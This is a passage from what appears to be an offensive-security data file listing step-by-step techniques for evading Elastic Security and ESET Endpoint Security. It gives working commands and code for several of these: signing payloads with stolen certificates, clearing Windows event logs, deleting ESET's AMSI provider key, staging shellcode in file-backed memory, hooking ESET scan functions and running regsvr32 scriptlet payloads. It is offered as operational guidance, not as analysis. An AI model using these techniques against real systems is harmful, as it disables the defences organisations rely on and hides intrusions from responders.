      tags: ["Elastic", "EQL", "detection rules", "expired cert", "T1562"],
      steps: [
        "Understand and bypass EQL detection rules:\n# Elastic Security uses EQL (Event Query Language) for detection\n# All rules are open-source: https://github.com/elastic/detection-rules\n# Study specific rules before operation:\n$ git clone https://github.com/elastic/detection-rules\n$ grep -r 'CreateRemoteThread' detection-rules/rules/\n# Modify TTPs to not match EQL rule conditions\n# EQL rules often check: parent process, command-line args, file paths",
        "Bypass Elastic endpoint via certificate abuse:\n# Elastic may have gaps in monitoring executables with valid/expired signatures\n# Sign payloads with legitimate code signing cert (purchased or stolen)\n# Expired certs can bypass some checks depending on config\n$ osslsigncode sign -certs signing.crt -key signing.key -in payload.exe -out signed_payload.exe\n# Elastic's default rules may not alert on binaries signed by known vendors",
        "Proxy injection (process proxy technique):\n# Inject via a process that Elastic doesn't heavily monitor\n# Find processes excluded from Elastic agent scope\n# Common exclusions: AV processes, backup software, specific vendor paths\n# DLL sideloading in excluded application directory bypasses agent\n# Check Elastic agent config for exclusion paths:\n$ cat /opt/Elastic/Agent/data/elastic-agent-*/install/endpoint-security.yml",
        "Leverage open-source nature of Elastic rules:\n# All Elastic detection rules are public — study them before each operation\n# Look for gaps: rules often cover common tools but miss custom implementations\n# Custom C2 and custom loaders avoid known rule signatures\n# Map your TTPs to rule coverage gaps — Elastic tags techniques with MITRE IDs\n# Test: run Elastic Security in lab, generate telemetry, check which rules fire\n# Modify technique slightly until no rule fires",
        "Evade Elastic's process and network monitoring:\n# Elastic agent collects process events, network events, file events\n# Avoid common IOC patterns in network traffic (known ports, signatures)\n# Use encrypted C2 with valid certificates — Elastic inspects DNS and HTTP metadata\n# Delete/overwrite malicious files after execution (fileless when possible)\n# Clear Windows Event Logs after operations:\n$ wevtutil cl System; wevtutil cl Security; wevtutil cl Application\n# Elastic relies heavily on Windows Event Log — clearing reduces detection surface"
      ]
    },
    {
      name: "ESET Endpoint Security Evasion",
      id: "T1562.ESET",
      summary: "ESET AMSI bypass • VAD scanning bypass • sub-page hooking • LiveGrid • HIPS bypass",
      description: "Techniques specific to bypassing ESET Endpoint Security and ESET Protect's AMSI, HIPS, and advanced memory scanning",
      tags: ["ESET", "AMSI", "VAD scanning", "sub-page hooking", "HIPS", "T1562"],
      steps: [
        "Bypass ESET's AMSI integration:\n# ESET registers its own AMSI provider (ekrn.exe integrates with AMSI)\n# Standard AMSI patching (AmsiScanBuffer) still effective\n# ESET's AMSI provider is in addition to Windows Defender AMSI\n# Check registered AMSI providers:\n$ reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\AMSI\\\\Providers\n# Disable ESET AMSI provider registration in registry (requires admin):\n$ reg delete 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\AMSI\\\\Providers\\\\{ESET_GUID}' /f",
        "Bypass VAD (Virtual Address Descriptor) scanning:\n# ESET scans VAD tree for suspicious memory regions\n# VAD scan checks: RWX regions, regions without backing file, anonymous allocations\n# Use file-backed sections instead of anonymous allocations:\n> HANDLE hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, len, NULL);\n> LPVOID mem = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS, 0, 0, len);\n> // Write shellcode, then change perms to RX\n# File-backed sections in VAD = has backing object = less suspicious than anonymous",
        "Sub-page hooking awareness:\n# ESET implements sub-page protection: monitors individual memory pages\n# ESET HIPS monitors sub-page level memory access patterns\n# Avoid direct memory overwrites of monitored regions\n# Use indirect access patterns for writing to sensitive memory\n# Hardware breakpoints to intercept ESET's scanning functions:\n# Set HWBP on ESET ekrn.exe exported scanning functions\n# Modify scan results via exception handler before ESET processes them",
        "Bypass ESET LiveGrid (cloud reputation):\n# LiveGrid checks file/process reputation against ESET cloud\n# New/unknown files may be blocked pending cloud verdict\n# Use files with established LiveGrid reputation (signed, known-good parent)\n# Fileless execution: no file on disk = no LiveGrid hash submission\n# Polymorphic builds: unique binary per engagement avoids hash-based blocking\n# Test new builds: check VirusTotal for ESET detection before deployment",
        "HIPS (Host Intrusion Prevention) bypass:\n# ESET HIPS monitors: process injection, file access, registry changes, network\n# Bypass HIPS rules by using alternative API chains:\n# Instead of WriteProcessMemory → NtWriteVirtualMemory directly via syscall\n# Avoid blocked operation sequences that trigger HIPS rule conditions\n# Use COM-based execution: COM server launches payload differently from direct exec\n$ regsvr32 /s /u /n /i:payload.sct scrobj.dll\n# ESET HIPS may not fully cover COM scriptlet execution paths in all versions"
      ]
    }
  ]
};